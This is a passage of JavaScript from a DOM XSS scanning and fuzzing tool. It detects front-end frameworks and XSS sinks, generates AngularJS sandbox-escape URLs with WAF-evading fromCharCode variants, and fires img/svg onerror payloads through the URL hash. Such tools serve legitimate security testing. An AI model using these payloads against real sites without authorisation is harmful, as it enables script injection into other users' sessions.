/**
 * DOM XSS Hunter v4.0 — Framework-Specific XSS Detection & Exploitation
 * Detects AngularJS, jQuery, Vue.js, React, and Trusted Types.
 * Provides framework-aware fuzzing and sink detection.
 *
 * Load order: config -> utils -> highlighter -> scanner -> flows -> hooks -> probe -> fuzzer -> frameworks -> reporter -> main
 */
(function () {
  'use strict';

  const ns = window.__DOMXSS;
  const { truncate, generateCanary } = ns.utils;
  const { addFinding } = ns.scanner;
  const { highlightEl } = ns.highlight;
  const ANGULAR_SANDBOX_ESCAPES = ns.ANGULAR_SANDBOX_ESCAPES;

  // =====================================================
  // toCharCodes(str)
  // Converts a string to String.fromCharCode(n1,n2,...) form.
  // Used to generate encoded bypass variants of payloads.
  // =====================================================
  function toCharCodes(str) {
    const codes = [];
    for (let i = 0; i < str.length; i++) {
      codes.push(str.charCodeAt(i));
    }
    return `String.fromCharCode(${codes.join(',')})`;
  }

  // =====================================================
  // Style constants for console output
  // =====================================================
  const S = {
    header:  'color:#ff00ff;font-weight:bold',
    title:   'color:#00ff00;font-weight:bold;font-size:13px',
    cyan:    'color:#00ddff;font-weight:bold',
    green:   'color:#00ff00;font-weight:bold',
    red:     'color:#ff0000;font-weight:bold',
    orange:  'color:#ff6600;font-weight:bold',
    yellow:  'color:#ffaa00',
    magenta: 'color:#ff00ff;font-weight:bold',
    dim:     'color:#888',
    sep:     'color:#555',
    code:    'font-family:monospace;color:#ccc;background:#1a1a1a;padding:2px 4px;font-size:11px',
  };

  // =====================================================
  // compareVersions — semver-like comparison
  // Returns -1 if a < b, 0 if equal, 1 if a > b
  // =====================================================
  function compareVersions(a, b) {
    if (!a || !b) return 0;
    // Handle wildcard versions like '1.6.x'
    const pa = a.replace(/x/gi, '9999').split('.').map(Number);
    const pb = b.replace(/x/gi, '9999').split('.').map(Number);
    for (let i = 0; i < Math.max(pa.length, pb.length); i++) {
      const va = pa[i] || 0;
      const vb = pb[i] || 0;
      if (va < vb) return -1;
      if (va > vb) return 1;
    }
    return 0;
  }

  // =====================================================
  // getURLParams — extract current URL parameters
  // =====================================================
  function getURLParams() {
    const params = {};
    try {
      const url = new URL(location.href);
      for (const [k, v] of url.searchParams.entries()) {
        params[k] = v;
      }
    } catch (e) { /* ignore */ }
    return params;
  }

  // =====================================================
  // getHashValue — get the hash fragment (without #)
  // =====================================================
  function getHashValue() {
    return location.hash.replace(/^#\/?/, '');
  }

  // =====================================================
  // getInlineScriptsText — concatenated text of inline scripts
  // =====================================================
  function getInlineScriptsText() {
    const texts = [];
    try {
      document.querySelectorAll('script:not([src])').forEach(s => {
        if (s.textContent && s.textContent.length < 50000) {
          texts.push(s.textContent);
        }
      });
    } catch (e) { /* ignore */ }
    return texts.join('\n');
  }

  // =====================================================
  // detectFrameworks()
  // Detect all JS frameworks present on the page.
  // =====================================================
  function detectFrameworks() {
    const result = {
      angular: { detected: false, version: null, hasNgApp: false, ngAppElement: null, strict: false },
      jquery:  { detected: false, version: null },
      vue:     { detected: false, version: null, hasVHtml: false },
      react:   { detected: false, hasDangerouslySet: false },
      alpine:  { detected: false, version: null, hasXHtml: false },
      htmx:    { detected: false, version: null, hasInnerHTMLSwap: false },
      trustedTypes: { detected: false, policies: [] },
    };

    // --- AngularJS ---
    try {
      if (window.angular) {
        result.angular.detected = true;
        if (window.angular.version && window.angular.version.full) {
          result.angular.version = window.angular.version.full;
        }
        // Check for strict contextual escaping
        try {
          if (window.angular.module) {
            result.angular.strict = !!document.querySelector('[ng-strict-di]') ||
              !!document.querySelector('[data-ng-strict-di]');
          }
        } catch (e) { /* ignore */ }
      }
      // ng-app detection (may exist even if angular object is loaded async)
      const ngAppEl = document.querySelector('[ng-app]') || document.querySelector('[data-ng-app]');
      if (ngAppEl) {
        result.angular.hasNgApp = true;
        result.angular.ngAppElement = ngAppEl;
        if (!result.angular.detected) {
          result.angular.detected = true; // ng-app without angular loaded = interesting
        }
      }
    } catch (e) { /* ignore */ }

    // --- jQuery ---
    try {
      const jqVersion = (window.jQuery && window.jQuery.fn && window.jQuery.fn.jquery) ||
        (window.$ && window.$.fn && window.$.fn.jquery);
      if (jqVersion) {
        result.jquery.detected = true;
        result.jquery.version = jqVersion;
      } else if (window.jQuery || (window.$ && typeof window.$ === 'function' && window.$.ajax)) {
        result.jquery.detected = true;
      }
    } catch (e) { /* ignore */ }

    // --- Vue.js ---
    try {
      if (window.Vue || window.__VUE__) {
        result.vue.detected = true;
        if (window.Vue && window.Vue.version) {
          result.vue.version = window.Vue.version;
        }
      }
      const vHtmlEls = document.querySelectorAll('[v-html]');
      if (vHtmlEls.length > 0) {
        result.vue.hasVHtml = true;
        if (!result.vue.detected) result.vue.detected = true;
      }
    } catch (e) { /* ignore */ }

    // --- React ---
    try {
      if (window.React || window.__REACT_DEVTOOLS_GLOBAL_HOOK__) {
        result.react.detected = true;
      }
      // Search for dangerouslySetInnerHTML in inline scripts
      const inlineText = getInlineScriptsText();
      if (inlineText.includes('dangerouslySetInnerHTML')) {
        result.react.detected = true;
        result.react.hasDangerouslySet = true;
      }
      // Also check for React root markers in the DOM
      if (!result.react.detected) {
        const rootEl = document.querySelector('[data-reactroot]') || document.getElementById('__next');
        if (rootEl) result.react.detected = true;
      }
    } catch (e) { /* ignore */ }

    // --- Alpine.js ---
    try {
      if (window.Alpine) {
        result.alpine = { detected: true, version: window.Alpine.version || null, hasXHtml: false };
      } else {
        const xDataEls = document.querySelectorAll('[x-data]');
        if (xDataEls.length > 0) {
          result.alpine = { detected: true, version: null, hasXHtml: false, xDataCount: xDataEls.length };
        }
      }
      if (result.alpine.detected) {
        const xHtmlEls = document.querySelectorAll('[x-html]');
        result.alpine.hasXHtml = xHtmlEls.length > 0;
        result.alpine.xHtmlCount = xHtmlEls.length;
      }
    } catch (e) { /* ignore */ }

    // --- htmx ---
    try {
      if (window.htmx) {
        result.htmx = { detected: true, version: window.htmx.version || null, hasInnerHTMLSwap: false };
      } else {
        const hxEls = document.querySelectorAll('[hx-get],[hx-post],[hx-put],[hx-delete]');
        if (hxEls.length > 0) {
          result.htmx = { detected: true, version: null, hasInnerHTMLSwap: false, hxCount: hxEls.length };
        }
      }
      if (result.htmx.detected) {
        const swapInner = document.querySelectorAll('[hx-swap="innerHTML"]');
        result.htmx.hasInnerHTMLSwap = swapInner.length > 0;
      }
    } catch (e) { /* ignore */ }

    // --- Trusted Types ---
    try {
      if (window.trustedTypes) {
        result.trustedTypes.detected = true;
        if (window.trustedTypes.defaultPolicy) {
          result.trustedTypes.policies.push('default');
        }
        // Attempt to discover policy names from CSP headers or meta tags
        try {
          const cspMeta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
          if (cspMeta) {
            const content = cspMeta.getAttribute('content') || '';
            const ttMatch = content.match(/trusted-types\s+([^;]+)/i);
            if (ttMatch) {
              const names = ttMatch[1].trim().split(/\s+/);
              for (const name of names) {
                if (name && name !== "'allow-duplicates'" && !result.trustedTypes.policies.includes(name)) {
                  result.trustedTypes.policies.push(name);
                }
              }
            }
          }
        } catch (e) { /* ignore */ }
      }
    } catch (e) { /* ignore */ }

    return result;
  }

  // =====================================================
  // detectAngularExpressionContext()
  // Check if user input reflects into AngularJS {{}} expressions.
  // =====================================================
  function detectAngularExpressionContext() {
    const results = [];

    try {
      // Must have AngularJS on the page
      const fw = detectFrameworks();
      if (!fw.angular.detected) return results;

      // Find all elements under ng-app scope
      const ngAppEl = fw.angular.ngAppElement || document.querySelector('[ng-app]') ||
        document.querySelector('[data-ng-app]') || document.body;
      if (!ngAppEl) return results;

      // Collect user-controllable input values
      const params = getURLParams();
      const hashVal = getHashValue();
      const inputs = [];

      for (const [key, val] of Object.entries(params)) {
        if (val && val.length >= 2) inputs.push({ source: `param:${key}`, value: val });
      }
      if (hashVal && hashVal.length >= 2) {
        inputs.push({ source: 'hash', value: hashVal });
        // Also try URL-decoded hash
        try {
          const decoded = decodeURIComponent(hashVal);
          if (decoded !== hashVal) inputs.push({ source: 'hash (decoded)', value: decoded });
        } catch (e) { /* ignore */ }
      }

      if (inputs.length === 0) return results;

      // Walk the DOM under ng-app looking for {{}} expressions
      const walker = document.createTreeWalker(ngAppEl, NodeFilter.SHOW_TEXT, null);
      let node;
      const expressionRe = /\{\{(.+?)\}\}/g;

      while ((node = walker.nextNode())) {
        const text = node.textContent;
        if (!text) continue;

        let match;
        expressionRe.lastIndex = 0;
        while ((match = expressionRe.exec(text)) !== null) {
          const expr = match[1];
          const fullExpr = match[0];
          const parent = node.parentElement;

          // Check if any user input appears inside this expression
          for (const input of inputs) {
            if (expr.includes(input.value)) {
              results.push({
                element: parent,
                expression: fullExpr,
                context: `Text node under <${parent ? parent.tagName.toLowerCase() : '?'}>`,
                injectable: true,
                source: input.source,
                inputValue: input.value,
              });
            }
          }

          // Even if no input found, report expressions near user-controlled areas
          if (results.length === 0 && parent) {
            results.push({
              element: parent,
              expression: fullExpr,
              context: `Expression in <${parent.tagName.toLowerCase()}>`,
              injectable: false,
              source: null,
              inputValue: null,
            });
          }
        }
      }

      // Also check attributes for {{ }} expressions
      ngAppEl.querySelectorAll('*').forEach(el => {
        for (const attr of el.attributes) {
          expressionRe.lastIndex = 0;
          let m;
          while ((m = expressionRe.exec(attr.value)) !== null) {
            const expr = m[1];
            for (const input of inputs) {
              if (expr.includes(input.value)) {
                results.push({
                  element: el,
                  expression: m[0],
                  context: `Attribute "${attr.name}" on <${el.tagName.toLowerCase()}>`,
                  injectable: true,
                  source: input.source,
                  inputValue: input.value,
                });
              }
            }
          }
        }
      });
    } catch (e) { /* ignore */ }

    return results;
  }

  // =====================================================
  // fuzzAngular(options)
  // Attempt AngularJS template injection and sandbox escapes.
  // =====================================================
  function fuzzAngular(options = {}) {
    const opts = {
      delay: 1000,
      tryEscapes: true,
      autoNav: false,   // set true to auto-navigate to first exploit URL
      ...options,
    };

    ns.log.info('%c\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557', S.magenta);
    ns.log.info('%c\u2551   ANGULAR TEMPLATE INJECTION FUZZER                   \u2551', S.magenta);
    ns.log.info('%c\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d', S.magenta);

    try {
      const fw = detectFrameworks();

      if (!fw.angular.detected) {
        ns.log.info('%c   AngularJS not detected on this page', S.dim);
        return;
      }

      const ver = fw.angular.version || 'unknown';
      ns.log.info(`%c   Version: %c${ver}`, S.dim, S.cyan);
      ns.log.info(`%c   ng-app: %c${fw.angular.hasNgApp ? 'YES' : 'NO'}`, S.dim, fw.angular.hasNgApp ? S.green : S.dim);

      // Step 1: Check if {{7*7}} is already evaluated on the page (from prior navigation)
      const canaryExpr = '{{7*7}}';
      const canaryResult = '49';
      const bodyText = document.body ? document.body.innerText : '';
      const ngAppEl = document.querySelector('[ng-app]') || document.querySelector('[data-ng-app]') || document.body;
      let expressionEvaluated = false;

      // Check if page already has Angular expression evaluation
      if (ngAppEl) {
        const text = ngAppEl.innerText || '';
        // Look for literal '49' near where canary would be, or check if {{}} expressions are being processed
        // Also check if current URL has Angular expressions that were evaluated
        const urlParams = new URL(location.href).searchParams;
        for (const [key, val] of urlParams) {
          if (val.includes('{{') && text.includes(canaryResult)) {
            expressionEvaluated = true;
            ns.log.info(`%c   Angular expressions ARE being evaluated (${canaryExpr} \u2192 ${canaryResult} in ?${key})`, S.red + ';font-weight:bold');
            break;
          }
        }

        // Check if Angular is processing any expressions by looking for compiled content
        if (!expressionEvaluated && !text.includes('{{')) {
          // No raw {{ in text = Angular is compiling, but we need to verify with a canary
          ns.log.info(`%c   Angular is compiling templates (no raw {{ visible)`, S.yellow);
        }
      }

      // Step 2: Find reflected URL parameters
      const params = getURLParams();
      const reflectedParams = [];
      for (const [key, val] of Object.entries(params)) {
        if (!val || val.length < 1) continue;
        if (bodyText.includes(val)) {
          reflectedParams.push(key);
        }
      }

      if (reflectedParams.length > 0) {
        ns.log.info(`%c   Reflected URL param(s): %c${reflectedParams.join(', ')}`, S.dim, S.green + ';font-weight:bold');
      } else {
        ns.log.info('%c   No reflected URL params detected \u2014 will use first param or "search"', S.dim);
      }

      const targetParam = reflectedParams[0] || Object.keys(params)[0] || 'search';

      // Step 3: Generate test URLs with sandbox escape payloads
      ns.log.info(`\n%c   \u2500\u2500 SANDBOX ESCAPE TEST URLS \u2500\u2500`, S.orange + ';font-weight:bold;font-size:13px');

      // Filter escapes by version
      const escapes = ANGULAR_SANDBOX_ESCAPES.filter(esc => {
        if (ver === 'unknown') return true;
        return compareVersions(ver, esc.maxVer) <= 0 || esc.maxVer === '99.0';
      });

      if (escapes.length === 0) {
        ns.log.info('%c   No applicable escapes for this version', S.dim);
        return;
      }

      const baseUrl = new URL(location.href);
      // Clean test params from URL
      baseUrl.searchParams.delete('__xss_test');
      baseUrl.searchParams.delete('__xss_probe');

      const testUrls = [];
      for (let i = 0; i < escapes.length; i++) {
        const esc = escapes[i];
        let testUrl;

        if (esc.urlSuffix) {
          // Special URL format: payload appended as raw query string
          // e.g., ?search=1&toString()...=1
          const base = baseUrl.toString().split('?')[0];
          testUrl = `${base}?${targetParam}=${esc.payload}`;
        } else {
          // Normal: payload goes in param value
          const url = new URL(baseUrl);
          url.searchParams.set(targetParam, esc.payload);
          testUrl = url.toString();
        }

        testUrls.push({ url: testUrl, desc: esc.desc, maxVer: esc.maxVer, payload: esc.payload });

        ns.log.info(`\n%c   #${i + 1} [<= v${esc.maxVer}] %c${esc.desc}`, S.cyan + ';font-weight:bold', S.dim);
        ns.log.info(`%c   Payload: %c${truncate(esc.payload, 150)}`, S.dim, S.code);
        ns.log.info(`%c   \uD83D\uDD17 %c${testUrl}`, S.green + ';font-weight:bold', 'color:#4488ff;font-family:monospace;font-size:11px;word-break:break-all');
      }

      ns.log.info(`\n%c   \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500`, S.dim);
      ns.log.info(`%c   ${testUrls.length} test URL(s) generated for ${targetParam} param`, S.yellow);
      ns.log.info('%c   \uD83D\uDCA1 Click any URL above or copy to browser — AngularJS processes expressions on page load', S.yellow);
      ns.log.info('');

      // ── String.fromCharCode() encoding bypass for filtered characters ──
      ns.log.info(`\n%c   ── ENCODED BYPASS VARIANTS ──`, S.orange + ';font-weight:bold;font-size:13px');
      ns.log.info('%c   String.fromCharCode() encoding to bypass character filters', S.dim);

      const encodedUrls = [];
      for (let i = 0; i < escapes.length; i++) {
        const esc = escapes[i];
        const payload = esc.payload;
        let encodedPayload = null;
        let encDesc = null;

        // Strategy 1: Replace alert(1) argument in constructor('alert(1)') patterns
        // Matches: constructor('alert(1)') -> constructor(String.fromCharCode(...))()
        if (/constructor\s*\(\s*'alert\(1\)'\s*\)/.test(payload)) {
          encodedPayload = payload.replace(
            /constructor\s*\(\s*'alert\(1\)'\s*\)/g,
            `constructor(${toCharCodes('alert(1)')})()`
          );
          // Fix double ()() — the original already has () after the constructor call
          encodedPayload = encodedPayload.replace(/\(\)\(\)\(\)/g, '()()');
          encDesc = `${esc.desc} [fromCharCode bypass]`;
        }
        // Strategy 2: Replace the string inside $eval('...') patterns
        // Matches: $eval('x=alert(1)') -> $eval(String.fromCharCode(...))
        else if (/\$eval\s*\(\s*'([^']+)'\s*\)/.test(payload)) {
          encodedPayload = payload.replace(
            /\$eval\s*\(\s*'([^']+)'\s*\)/g,
            (match, inner) => `$eval(${toCharCodes(inner)})`
          );
          encDesc = `${esc.desc} [$eval fromCharCode bypass]`;
        }

        if (!encodedPayload) continue;

        // Generate test URL for the encoded variant
        let testUrl;
        if (esc.urlSuffix) {
          const base = baseUrl.toString().split('?')[0];
          testUrl = `${base}?${targetParam}=${encodedPayload}`;
        } else {
          const url = new URL(baseUrl);
          url.searchParams.set(targetParam, encodedPayload);
          testUrl = url.toString();
        }

        encodedUrls.push({ url: testUrl, desc: encDesc, maxVer: esc.maxVer, payload: encodedPayload, originalIndex: i + 1 });

        ns.log.info(`\n%c   #E${encodedUrls.length} [<= v${esc.maxVer}] %c${encDesc}`, S.cyan + ';font-weight:bold', S.dim);
        ns.log.info(`%c   Original #${i + 1}: %c${truncate(esc.payload, 120)}`, S.dim, S.code);
        ns.log.info(`%c   Encoded:  %c${truncate(encodedPayload, 200)}`, S.dim, S.code);
        ns.log.info(`%c   \uD83D\uDD17 %c${testUrl}`, S.green + ';font-weight:bold', 'color:#4488ff;font-family:monospace;font-size:11px;word-break:break-all');
      }

      if (encodedUrls.length === 0) {
        ns.log.info('%c   No encodable payloads found for current escape set', S.dim);
      } else {
        ns.log.info(`\n%c   \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500`, S.dim);
        ns.log.info(`%c   ${encodedUrls.length} encoded bypass URL(s) generated`, S.yellow);
        ns.log.info('%c   These variants replace string literals with String.fromCharCode() to evade WAF/filter rules', S.dim);
      }

      // Merge encoded URLs into testUrls for unified access
      for (const eu of encodedUrls) {
        testUrls.push(eu);
      }
      ns.log.info('');

      // Store test URLs for programmatic access
      window.__domxss_angular_urls = testUrls;
      ns.log.info('%c   Test URLs stored in: %cwindow.__domxss_angular_urls', S.dim, S.code);
      ns.log.info('%c   Auto-navigate: %cdomxss.frameworks.angular({autoNav:true})', S.dim, S.code);

      // Auto-navigate if requested
      if (opts.autoNav && testUrls.length > 0) {
        ns.log.info(`\n%c   \uD83D\uDE80 Auto-navigating to test URL #1...`, S.red + ';font-weight:bold');
        setTimeout(() => {
          location.href = testUrls[0].url;
        }, 500);
      }

      // Log finding
      addFinding('sink', {
        file: '(frameworks.js)', origin: 'Angular-fuzz', line: 0,
        match: 'AngularJS Template Injection Vector', category: 'Angular Expression',
        severity: 'critical',
        code: `AngularJS v${ver} detected with reflected param "${targetParam}". ${testUrls.length} sandbox escape URLs generated.`,
        url: location.href,
      });

    } catch (e) {
      ns.log.info(`%c   Error: ${e.message}`, S.dim);
    }
  }

  // =====================================================
  // detectJQuerySinks()
  // Find jQuery-specific sink patterns in inline scripts.
  // =====================================================
  function detectJQuerySinks() {
    const results = [];

    try {
      const fw = detectFrameworks();
      if (!fw.jquery.detected) return results;

      const inlineText = getInlineScriptsText();
      const scripts = [];
      document.querySelectorAll('script:not([src])').forEach(s => {
        if (s.textContent && s.textContent.length < 50000) {
          scripts.push({ el: s, text: s.textContent });
        }
      });

      // Patterns that indicate jQuery selector injection
      const sinkPatterns = [
        {
          re: /\$\s*\(\s*(?:location\.hash|location\.search|location\.href|document\.URL|window\.location)/gi,
          type: 'selector-injection',
          risk: 'critical',
          desc: 'jQuery selector uses URL/hash directly — classic DOM XSS',
        },
        {
          re: /\$\s*\(\s*(?:decodeURIComponent|unescape|atob)\s*\(/gi,
          type: 'selector-injection-decoded',
          risk: 'critical',
          desc: 'jQuery selector uses decoded user input',
        },
        {
          re: /jQuery\s*\(\s*(?:location\.hash|location\.search|location\.href)/gi,
          type: 'selector-injection',
          risk: 'critical',
          desc: 'jQuery() selector uses URL/hash directly',
        },
        {
          re: /\$\(window\)\s*\.\s*on\s*\(\s*['"]hashchange['"]/gi,
          type: 'hashchange-listener',
          risk: 'high',
          desc: 'jQuery hashchange listener — may parse hash as HTML',
        },
        {
          re: /addEventListener\s*\(\s*['"]hashchange['"]\s*,\s*function[^}]*\$\s*\(/gi,
          type: 'hashchange-jquery-sink',
          risk: 'critical',
          desc: 'hashchange handler feeds hash into jQuery $() — PortSwigger classic',
        },
        {
          re: /\.html\s*\(\s*(?:location\.|document\.|window\.location|decodeURIComponent|unescape)/gi,
          type: 'html-sink',
          risk: 'critical',
          desc: '.html() uses URL/location data — HTML injection',
        },
        {
          re: /\.append\s*\(\s*(?:location\.|document\.|window\.location)/gi,
          type: 'append-sink',
          risk: 'critical',
          desc: '.append() uses URL/location data — HTML injection',
        },
        {
          re: /\.prepend\s*\(\s*(?:location\.|document\.|window\.location)/gi,
          type: 'prepend-sink',
          risk: 'high',
          desc: '.prepend() uses URL/location data',
        },
        {
          re: /\.after\s*\(\s*(?:location\.|document\.|window\.location)/gi,
          type: 'after-sink',
          risk: 'high',
          desc: '.after() uses URL/location data',
        },
        {
          re: /\.before\s*\(\s*(?:location\.|document\.|window\.location)/gi,
          type: 'before-sink',
          risk: 'high',
          desc: '.before() uses URL/location data',
        },
        {
          re: /\.replaceWith\s*\(\s*(?:location\.|document\.|window\.location)/gi,
          type: 'replaceWith-sink',
          risk: 'high',
          desc: '.replaceWith() uses URL/location data',
        },
        {
          re: /\$\s*\.\s*parseHTML\s*\(\s*(?:location\.|document\.|window\.location)/gi,
          type: 'parseHTML-sink',
          risk: 'critical',
          desc: '$.parseHTML() with URL data — parses attacker-controlled HTML',
        },
        {
          re: /\$\s*\.\s*globalEval\s*\(/gi,
          type: 'globalEval',
          risk: 'critical',
          desc: '$.globalEval() — evaluates string as JavaScript',
        },
      ];

      for (const script of scripts) {
        const lines = script.text.split('\n');
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i];
          for (const pat of sinkPatterns) {
            pat.re.lastIndex = 0;
            const m = line.match(pat.re);
            if (m) {
              const result = {
                type: pat.type,
                code: truncate(line.trim(), 200),
                element: script.el,
                risk: pat.risk,
                desc: pat.desc,
                line: i + 1,
                match: m[0],
              };
              results.push(result);

              // Also register as a scanner finding
              addFinding('sink', {
                file: '(inline-script)', origin: 'jQuery-sink', line: i + 1,
                match: m[0], category: `jQuery ${pat.type}`,
                severity: pat.risk,
                code: truncate(line.trim(), 200),
                url: null,
              });
            }
          }
        }
      }

      // Additionally, check for the classic pattern: hashchange + $(location.hash)
      // even across multiple lines
      if (inlineText.includes('hashchange') && (
        inlineText.includes('$(location.hash') ||
        inlineText.includes('$(decodeURIComponent(location.hash') ||
        inlineText.includes('$(window.location.hash')
      )) {
        results.push({
          type: 'hashchange-selector-combo',
          code: 'hashchange listener + $(location.hash) pattern detected',
          element: null,
          risk: 'critical',
          desc: 'Classic jQuery DOM XSS: hashchange event feeds location.hash into $() selector',
        });
      }

    } catch (e) { /* ignore */ }

    return results;
  }

  // =====================================================
  // fuzzJQueryHashchange()
  // Test jQuery hashchange-based XSS.
  // =====================================================
  function fuzzJQueryHashchange() {
    ns.log.info('%c\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557', S.magenta);
    ns.log.info('%c\u2551   JQUERY HASHCHANGE XSS FUZZER                        \u2551', S.magenta);
    ns.log.info('%c\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d', S.magenta);

    try {
      const fw = detectFrameworks();

      if (!fw.jquery.detected) {
        ns.log.info('%c   jQuery not detected on this page', S.dim);
        return;
      }

      ns.log.info(`%c   jQuery version: %c${fw.jquery.version || 'unknown'}`, S.dim, S.cyan);

      // Check for hashchange listeners
      const inlineText = getInlineScriptsText();
      const hasHashchangeListener = inlineText.includes('hashchange') ||
        inlineText.includes('onhashchange');

      ns.log.info(`%c   hashchange listener: %c${hasHashchangeListener ? 'DETECTED' : 'not found'}`,
        S.dim, hasHashchangeListener ? S.green : S.dim);

      if (!hasHashchangeListener) {
        ns.log.info('%c   No hashchange listener found. Skipping hashchange fuzz.', S.yellow);
        ns.log.info('%c   jQuery sinks may still be exploitable via other vectors.', S.dim);
        return;
      }

      // Classic jQuery hashchange XSS test
      // The canonical PortSwigger payload: set hash to an element selector that starts with <
      const verifyId = Math.random().toString(36).substring(2, 6);
      const testPayloads = [
        {
          hash: `#<img src=x onerror=window.__jqxss_${verifyId}=1>`,
          desc: 'img onerror via hash -> $() selector',
          check: () => !!window[`__jqxss_${verifyId}`],
        },
        {
          hash: `#<svg onload=window.__jqxss_${verifyId}=1>`,
          desc: 'svg onload via hash -> $() selector',
          check: () => !!window[`__jqxss_${verifyId}`],
        },
        {
          hash: `#<iframe onload=window.__jqxss_${verifyId}=1>`,
          desc: 'iframe onload via hash -> $() selector',
          check: () => !!window[`__jqxss_${verifyId}`],
        },
      ];

      ns.log.info(`\n%c   Testing ${testPayloads.length} payloads via hashchange...`, S.yellow);

      let confirmed = false;
      let testIndex = 0;

      function testNext() {
        if (testIndex >= testPayloads.length || confirmed) {
          // Done
          if (!confirmed) {
            ns.log.info(`\n%c   No payload executed via hashchange`, S.dim);
            ns.log.info(`%c   The listener may sanitize or may not use $() on the hash value`, S.dim);
          }
          // Cleanup
          try {
            delete window[`__jqxss_${verifyId}`];
            location.hash = '';
          } catch (e) { /* ignore */ }
          return;
        }

        const test = testPayloads[testIndex];
        testIndex++;

        ns.log.info(`%c   [${testIndex}/${testPayloads.length}] %c${test.desc}`, S.cyan, S.dim);
        ns.log.info(`%c   ${truncate(test.hash, 120)}`, S.code);

        try {
          location.hash = test.hash.substring(1); // Remove leading #
          window.dispatchEvent(new HashChangeEvent('hashchange'));
        } catch (e) { /* ignore */ }

        setTimeout(() => {
          let executed = false;
          try { executed = test.check(); } catch (e) { /* ignore */ }

          if (executed) {
            confirmed = true;
            ns.log.info(`%c   XSS CONFIRMED via jQuery hashchange!`, S.red + ';font-size:14px;background:#330000;padding:4px 8px');
            ns.log.info(`%c   Payload: %c${test.hash}`, S.dim, S.red);
            ns.log.info(`%c   ${test.desc}`, S.orange);

            addFinding('sink', {
              file: '(frameworks.js)', origin: 'jQuery-hashchange-fuzz', line: 0,
              match: 'jQuery hashchange XSS', category: 'jQuery Selector',
              severity: 'critical',
              code: `Hash payload executed: ${test.hash}`,
              url: location.href,
            });
          } else {
            ns.log.info(`%c   Not executed`, S.dim);
          }

          try { delete window[`__jqxss_${verifyId}`]; } catch (e) { /* ignore */ }
          testNext();
        }, 800);
      }

      testNext();

    } catch (e) {
      ns.log.info(`%c   Error: ${e.message}`, S.dim);
    }
  }

  // =====================================================
  // detectVueSinks()
  // Find Vue.js-specific XSS vectors.
  // =====================================================
  function detectVueSinks() {
    const results = [];

    try {
      const fw = detectFrameworks();
      if (!fw.vue.detected) return results;

      // v-html directives
      const vHtmlEls = document.querySelectorAll('[v-html]');
      vHtmlEls.forEach(el => {
        const binding = el.getAttribute('v-html');
        results.push({
          type: 'v-html',
          element: el,
          binding,
          risk: 'high',
          desc: `v-html="${binding}" — renders raw HTML, XSS if user-controlled`,
          tag: el.tagName.toLowerCase(),
        });

        addFinding('sink', {
          file: '(DOM-attribute)', origin: 'Vue-v-html', line: 0,
          match: `v-html="${binding}"`, category: 'Vue HTML',
          severity: 'high',
          code: truncate(`<${el.tagName.toLowerCase()} v-html="${binding}">`, 200),
          url: null,
        });
      });

      // Check for template injection possibilities
      // Vue 2.x: new Vue({ template: ... }) with user input
      // Vue 3.x: v-html with user input
      const inlineText = getInlineScriptsText();

      // Vue template compilation from user input
      const templatePatterns = [
        /new\s+Vue\s*\(\s*\{[^}]*template\s*:\s*(?:location\.|document\.|window\.)/gi,
        /Vue\.compile\s*\(\s*(?:location\.|document\.|window\.)/gi,
        /Vue\.component\s*\([^,]+,\s*\{[^}]*template\s*:\s*(?:location\.|document\.)/gi,
      ];

      for (const pat of templatePatterns) {
        pat.lastIndex = 0;
        const m = inlineText.match(pat);
        if (m) {
          results.push({
            type: 'template-injection',
            element: null,
            binding: m[0],
            risk: 'critical',
            desc: 'Vue template compiled from user-controlled source',
          });
        }
      }

    } catch (e) { /* ignore */ }

    return results;
  }

  // =====================================================
  // detectReactSinks()
  // Find React-specific XSS vectors.
  // =====================================================
  function detectReactSinks() {
    const results = [];

    try {
      const fw = detectFrameworks();
      if (!fw.react.detected) return results;

      // dangerouslySetInnerHTML in inline scripts
      const scripts = [];
      document.querySelectorAll('script:not([src])').forEach(s => {
        if (s.textContent && s.textContent.length < 50000) {
          scripts.push({ el: s, text: s.textContent });
        }
      });

      for (const script of scripts) {
        const lines = script.text.split('\n');
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i];
          if (/dangerouslySetInnerHTML/i.test(line)) {
            // Check if it uses user-controlled data
